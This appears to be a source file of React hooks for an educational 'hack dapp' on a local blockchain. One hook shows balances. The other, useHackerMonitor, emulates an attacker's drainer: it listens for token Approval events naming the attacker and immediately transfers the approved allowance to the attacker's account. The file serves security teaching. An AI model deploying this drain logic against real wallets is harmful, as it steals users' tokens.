/**
 * Hooks for the hackdapp code to make our life easier.
 */

import {ReallyValuableToken__factory} from "@securityspeedrun/common-contracts";
import {BigNumber, ethers} from "ethers";
import {useEffect, useState} from "react";
import {chainId, useAccount, useBalance, useContractEvent, useNetwork, useProvider} from "wagmi";
import {localhost} from "wagmi/chains";
import {rvtAbi} from "../abis/rvtAbi";
import {accounts, contracts, testAccountPrivateKeys} from "../constants";

/**
 * Hook to handle all our nice statuses in HackDapp
 */
export function useHackDapp() {
  const {chain} = useNetwork()
  const [wrongChain, setWrongChain] = useState(false)

  useEffect(() => {
    if (chain?.id) {
      // console.log(`useEffect: `, {wrongChain, chain, localhost, t: chain?.id === localhost.id})
      setWrongChain(chain.id !== localhost.id)
    }
  }, [chain])

  const {address} = useAccount()
  const {data: myEthBalance} = useBalance(
    {
      address,
      chainId: localhost.id,
      formatUnits: "ether",
      watch: true,
    })
  const {data: myRvtBalance} = useBalance(
    {
      address,
      token: contracts.reallyValuableToken,
      chainId: localhost.id,
      formatUnits: "ether",
      watch: true,
    })
  const {data: myDTBalance} = useBalance(
    {
      address,
      token: contracts.dappCoinToken,
      chainId: localhost.id,
      formatUnits: "wei",
      watch: true,
    })

  return {wrongChain, myEthBalance, myRvtBalance, myDTBalance}
}

/**
 * This hook would emulate what the hackers server was doing in the background somewhere monitoring the blockchain
 * for approval events to its account so it could instantly drain them.
 */
export function useHackerMonitor() {
  const {address} = useAccount()
  const [hacked, setHacked] = useState(false);
  const provider = useProvider({chainId: chainId.localhost})

  const wallet = new ethers.Wallet(testAccountPrivateKeys.attacker);
  const walletSigner = wallet.connect(provider);
  const rvtInst = ReallyValuableToken__factory.connect(contracts.reallyValuableToken, walletSigner)

  const {data: attackerEthBalance} = useBalance(
    {
      address: accounts.attacker,
      chainId: localhost.id,
      formatUnits: "ether",
      watch: true,
    })

  const {data: attackerRvtBalance} = useBalance(
    {
      address: accounts.attacker,
      token: contracts.reallyValuableToken,
      chainId: localhost.id,
      formatUnits: "ether",
      watch: true,
    })

  useEffect(() => {
    setHacked(attackerRvtBalance !== undefined && attackerRvtBalance.value.gt(0))
  }, [attackerRvtBalance])

  // keep an eye on the approvals and if we get an approval with our address in it and we have some allowance then take it.
  useContractEvent({
    address: contracts.reallyValuableToken,
    abi: rvtAbi,
    eventName: "Approval",
    async listener(owner: string, spender: string, amount: BigNumber) {
      // Approval(owner, spender, amount)
      console.log(`Approve Listener: `, {myAddress: accounts.attacker, owner, spender, amount})
      if (accounts.attacker === spender) {
        const fuckingAddress: string = address === undefined ? "" : address?.toString();
        const allowance = await rvtInst.allowance(fuckingAddress, accounts.attacker)
        if(!allowance.isZero()){
          console.log(`We have been approved: lets go`, {amount: amount.toString(), allowance: allowance.toString()})
          rvtInst.transferFrom(fuckingAddress, accounts.attacker, allowance)
            .then(value => alert(value), reason => alert(reason))
        }
      }

    },
  })

  return {hacked, attackerEthBalance, attackerRvtBalance}
}
